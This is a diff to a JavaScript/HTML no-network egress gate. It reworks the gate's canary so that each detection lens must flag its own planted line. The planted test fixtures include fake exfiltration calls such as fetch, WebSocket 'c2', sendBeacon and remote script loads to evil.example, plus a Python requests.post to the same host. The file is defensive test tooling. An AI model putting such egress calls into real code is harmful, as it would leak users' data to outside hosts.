@@ -93,10 +93,11 @@ cloud SDK phoning data out) — serving bundles on the LAN is not egress.</div>
 <h2>4 · Negative control <span class="mut">— the gate must catch planted egress (anti-vacuous-pass)</span></h2>
 <div class="canarybox">
 <p class="sub" style="margin:12px 0 8px">A canary that ships with the gate, exercising every lens. <b>Static:</b> a
-test-only fixture with a real <code>fetch("https://evil.example/x")</code> (+ remote <code>&lt;script src&gt;</code>,
-<code>WebSocket</code>, <code>sendBeacon</code>, <code>@import</code>) the scanner <b>must</b> flag, plus a benign
+test-only line per lens — <code>fetch</code>, <code>import()</code>, <code>WebSocket</code>, <code>XMLHttpRequest</code>,
+<code>EventSource</code>, <code>sendBeacon</code>, JS <code>.src=</code>, <code>&lt;script src&gt;</code>, <code>@import</code>,
+CSS <code>url()</code> — each scanned alone, and each <b>must</b> be flagged by its own lens (one row per lens, never a sum), plus a benign
 local string it must <b>not</b> (and a remote <code>&lt;a href&gt;</code> it must classify as nav, not egress).
-<b>Runtime:</b> a module that attempts one remote <code>fetch</code>/<code>WebSocket</code>/<code>sendBeacon</code>
+<b>Runtime:</b> a module that attempts one remote <code>fetch</code>/<code>WebSocket</code>/<code>sendBeacon</code>/<code>XMLHttpRequest</code>/<code>EventSource</code>
 against the trap (must throw) + one local fetch (must be allowed). <b>Python:</b> a planted
 <code>requests.post("https://evil.example")</code> the Python lens must flag. Any miss HARD-FAILS the whole gate.</p>
 <p id="canarySummary" class="sub" style="margin:0 0 8px"></p>
@@ -446,20 +447,30 @@ function localScriptSrcs(html){
     elRow(canTb,['<td>'+esc(name)+'</td>','<td class="det">'+esc(expect)+'</td>','<td>'+(passed? pill('ok','caught ✓'):pill('bad','MISSED ✗'))+(detail?' <span class="det">'+esc(detail)+'</span>':'')+'</td>']);
   };
 
-  // (1a) STATIC canary — planted egress MUST be flagged
+  // (1a) STATIC canary — EACH planted egress line MUST be flagged by ITS OWN lens.
+  //  Row 2026-11-08-the-no-network-canary-sums-its-lenses: this block used to assert one SUM,
+  //  `plantedHits >= 5` over a set worth 7, so one dead lens still passed. Muse disabled
+  //  RESOURCE_REMOTE, planted a remote <script src> in OxyDex.html, and the canary read exactly 5.
+  //  Each line is now scanned alone and must yield a hit in the bucket and kind that its lens
+  //  produces, so a dead lens reds its own row and no other lens can cover for it.
   const PLANTED = [
-    'fetch("https://evil.example/exfil?d=" + payload);',
-    'var ws = new WebSocket("wss://evil.example/c2");',
-    'navigator.sendBeacon("https://evil.example/beacon", body);',
-    'img.src = "https://evil.example/pixel.gif";',
-    '<script src="https://cdn.evil.example/track.js"><\/script>',
-    '@import url("https://fonts.evil.example/f.css");'
-  ].join('\n');
-  const plantedScan = scanText(PLANTED, 'canary/planted');
-  const plantedHits = plantedScan.remote.length + plantedScan.transport.length;
-  const caughtEvilFetch = plantedScan.remote.some(h=>h.kind==='fetch' && /evil\.example/.test(h.url));
-  canRow('static · planted remote fetch', 'flag fetch("https://evil.example/x")', caughtEvilFetch, caughtEvilFetch?'':'detector did NOT flag the planted fetch');
-  canRow('static · planted egress set', 'flag all ≥5 planted egress lines', plantedHits>=5, plantedHits+' flagged');
+    { lens: 'fetch()',        line: 'fetch("https://evil.example/exfil?d=" + payload);',          bucket: 'remote',    kind: 'fetch' },
+    { lens: 'import()',       line: 'import("https://evil.example/mod.js");',                       bucket: 'remote',    kind: 'import()' },
+    { lens: 'WebSocket',      line: 'var ws = new WebSocket("wss://evil.example/c2");',             bucket: 'transport', kind: 'transport' },
+    { lens: 'XMLHttpRequest', line: 'var x = new XMLHttpRequest(); x.open("GET", u);',              bucket: 'transport', kind: 'transport' },
+    { lens: 'EventSource',    line: 'var es = new EventSource("https://evil.example/stream");',     bucket: 'transport', kind: 'transport' },
+    { lens: 'sendBeacon',     line: 'navigator.sendBeacon("https://evil.example/beacon", body);',   bucket: 'transport', kind: 'transport' },
+    { lens: 'JS .src=',       line: 'img.src = "https://evil.example/pixel.gif";',                  bucket: 'remote',    kind: 'resource' },
+    { lens: '<script src>',   line: '<script src="https://cdn.evil.example/track.js"><\/script>',  bucket: 'remote',    kind: 'resource' },
+    { lens: '@import',        line: '@import url("https://fonts.evil.example/f.css");',             bucket: 'remote',    kind: '@import' },
+    { lens: 'CSS url()',      line: '.x{ background:url("https://evil.example/bg.png") }',          bucket: 'remote',    kind: 'css url()' }
+  ];
+  for(const p of PLANTED){
+    const sc = scanText(p.line, 'canary/planted');
+    const hit = sc[p.bucket].some(h=>h.kind===p.kind);
+    canRow('static · planted '+p.lens, 'flag as '+p.bucket+' / '+p.kind, hit,
+      hit ? '' : 'lens did NOT flag it — remote '+sc.remote.map(h=>h.kind).join(',')+' · transport '+sc.transport.length);
+  }
 
   // (1b) STATIC canary — benign local MUST NOT be flagged; remote <a href> = nav, not egress
   const BENIGN = [
@@ -484,6 +495,8 @@ function localScriptSrcs(html){
       attempt('remote-fetch', function(){ return window.fetch('https://evil.example/x'); });
       attempt('remote-ws',    function(){ return new window.WebSocket('wss://evil.example/c2'); });
       attempt('remote-beacon',function(){ return navigator.sendBeacon('https://evil.example/b','d'); });
+      attempt('remote-xhr',   function(){ var x = new XMLHttpRequest(); x.open('GET','https://evil.example/x'); return null; });
+      attempt('remote-es',    function(){ return new window.EventSource('https://evil.example/stream'); });
       attempt('local-fetch',  function(){ return window.fetch('no-network-canary-local-probe.json'); });
     })();
   <\/script></body></html>`;
@@ -493,6 +506,8 @@ function localScriptSrcs(html){
   canRow('runtime · remote fetch blocked', 'trap throws on https://evil.example', blockedSet.has('remote-fetch'));
   canRow('runtime · remote WebSocket blocked', 'trap throws on wss://evil.example', blockedSet.has('remote-ws'));
   canRow('runtime · remote sendBeacon blocked', 'trap throws on https://evil.example', blockedSet.has('remote-beacon'));
+  canRow('runtime · remote XHR blocked', 'trap throws on XMLHttpRequest.open(https://evil.example)', blockedSet.has('remote-xhr'));
+  canRow('runtime · remote EventSource blocked', 'trap throws on https://evil.example', blockedSet.has('remote-es'));
   canRow('runtime · local fetch allowed', 'same-origin fetch NOT thrown', allowedSet.has('local-fetch'), 'trap must discriminate, not block-all');
 
   // (3) PYTHON canary — planted outbound client MUST be flagged
